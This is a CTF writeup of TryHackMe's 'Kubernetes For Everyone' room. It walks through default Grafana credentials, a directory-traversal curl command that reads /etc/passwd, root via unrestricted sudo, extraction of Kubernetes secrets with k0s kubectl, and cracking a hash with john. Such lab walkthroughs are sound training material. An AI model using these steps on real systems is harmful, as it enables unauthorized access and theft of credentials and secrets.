---
title: "Kubernetes For Everyone - TryHackMe Writeup"
date: 2025-12-07
draft: false
summary: "Writeup for Kubernetes For Everyone CTF challenge on TryHackMe."
tags: ["linux", "hardcoded creds", "lfi", "sudo", "kubernetes", "bruteforce"]
categories: ["writeups"]
series: []
showToc: true
cover:
  image: "https://cdn.ziomsec.com/k8-for-everyone/cover.webp"
  caption: "Kubernetes For Everyone TryHackMe Challenge"
  alt: "Kubernetes For Everyone cover"
platform: "TryHackMe"
author: "Moiz Bootwala"
---

A Kubernetes hacking challenge for DevOps/SRE enthusiasts.
<!--more-->
To access the machine, click on the link given below:
- https://tryhackme.com/room/kubernetesforyouly

## Scanning

I performed an **nmap** aggressive scan to find open ports and services running on the target:

```shell
nmap -A -p- TARGET --min-rate 10000 -oN k8.nmap
```

![performing an nmap scan on kubernetes for everyone machine](https://cdn.ziomsec.com/k8-for-everyone/1.webp)

## Initial Foothold

The **nmap** scan revealed a **Grafana** login page on port 3000.

![acessing the web application](https://cdn.ziomsec.com/k8-for-everyone/2.webp)

The default credentials are `admin:admin` so I used it to log into the instance.

![accessing the dashboard](https://cdn.ziomsec.com/k8-for-everyone/3.webp)

Based on the Grafana version, I also found a directory traversal and arbitrary file read exploit for it:
- https://www.exploit-db.com/exploits/50581

I then accessed the web application running on port 5000.

![accessing the second application running on port 5000](https://cdn.ziomsec.com/k8-for-everyone/4.webp)

Viewing the source code revealed a **Pastebin** link.
- https://pastebin.com/cPs69B0y

![viewing the source code](https://cdn.ziomsec.com/k8-for-everyone/5.webp)

When I accessed the URL, I found a base32 encoded text.

![visiting the pastebin link](https://cdn.ziomsec.com/k8-for-everyone/6.webp)

I decoded this using **CyberChef** and got the string: `vagrant`
- https://gchq.github.io/CyberChef/

The exploit found earlier on exploit-db was able to perform file read by accessing `/public/plugins/{plugin name}/../../../../../../../../..{File to read}`

Hence, I used the method to read the `/etc/passwd` file

```shell
curl --path-as-is http://TARGET:3000/public/plugin/zipkin/../../../../../../../../etc/passwd
```

![reading the passwd file](https://cdn.ziomsec.com/k8-for-everyone/7.webp)

I then tried using the password found here with the usernames present in the file to log in with `ssh` but failed. However, when I tried using the password against `vagrant`, I was able to log in.

```shell
ssh vagrant@TARGET
```

![logging in as vagrant](https://cdn.ziomsec.com/k8-for-everyone/8.webp)

## Privilege Escalation

I then viewed my **sudo** privs to find that I could run any command as `root`

```shell
sudo -l
```

![listing sudo privs](https://cdn.ziomsec.com/k8-for-everyone/9.webp)

I then spawned a shell as `root` by exploiting this:

```shell
sudo bash -i
```

![spawning root shell](https://cdn.ziomsec.com/k8-for-everyone/10.webp)

## Post Exploitation

After gaining root shell, I viewed the process that were running on the target and found that it was part of a Kubernetes cluster.

```shell
ps -aux
```

![listing processes](https://cdn.ziomsec.com/k8-for-everyone/11.webp)

Since `k0s`  was present in one of the processes, I could use it to interact with the cluster.

![using k0s to interact with cluster](https://cdn.ziomsec.com/k8-for-everyone/12.webp)

I listed secrets present in the current namespace

```shell
k0s kubectl get secrets
kubectl describe secret k8s.authentication
```

![listing cluster secrets](https://cdn.ziomsec.com/k8-for-everyone/13.webp)

I then viewed the secret by editing it

```shell
k0s kubectl edit secret k8s.authentication
```

![listing cluster secrets](https://cdn.ziomsec.com/k8-for-everyone/14.webp)

The id was most likely encoded using base64. So I decoded it and found the first flag

```shell
k0s kubectl get secret k8s.authentication -o jsonpath='{.data}'
echo 'ID_VALUE' | base64 -d
```

![capturing the first flag](https://cdn.ziomsec.com/k8-for-everyone/15.webp)

I then viewed the namespaces and pods present in the cluster

```shell
k0s kubectl get namespace
k0s kubectl get pods -A
```

![listing namespace and pod information](https://cdn.ziomsec.com/k8-for-everyone/16.webp)

`k0s` pods are located in `/var/lib/k0s/containerd` so I navigated to the directory and explored the snapshots present in it.

```shell
cd /var/lib/k0s/containerd/
```

![listing cluster snapshots](https://cdn.ziomsec.com/k8-for-everyone/17.webp)

While exploring I came across a git repository

![inspecting the git repo](https://cdn.ziomsec.com/k8-for-everyone/18.webp)

I then viewed my commit history and started going through each of those and found a flag in one of the commit

```shell
git log
git show HASH
```

![viewing the commit history](https://cdn.ziomsec.com/k8-for-everyone/19.webp)

![capturing the flag](https://cdn.ziomsec.com/k8-for-everyone/20.webp)

When I listed the available pod, there was an interesting one called `internship-job-5drbm` so I looked into it to understand what it did

```shell
k0s kubectl describe pod internship-job-5drbm --namespace=internship
```

![inspecting the pod](https://cdn.ziomsec.com/k8-for-everyone/21.webp)

There was a suspicious hash so I tried cracking it using **john**

```shell
echo 'HASH' > hash
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

![cracking the hash with john](https://cdn.ziomsec.com/k8-for-everyone/22.webp)

That's it from my side! Until next time :)

---